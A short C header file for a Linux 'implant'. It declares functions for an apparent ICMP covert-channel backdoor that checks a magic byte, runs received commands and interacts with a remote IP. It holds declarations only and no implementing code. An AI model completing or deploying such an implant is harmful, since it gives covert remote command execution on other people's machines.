#ifndef implant_H
#define implant_H

#include <linux/icmp.h>
#define BUFFER_SIZE 4096

void implant_init_n_call(char *dest_ip);
int read_from_socket(int sockfd, char *buffer,int size);
int create_socket(void);
int check_magic_byte(struct icmphdr *icmp);
char *invoke_command(char *data);
void interact(int sockfd, char *dest_ip);

#endif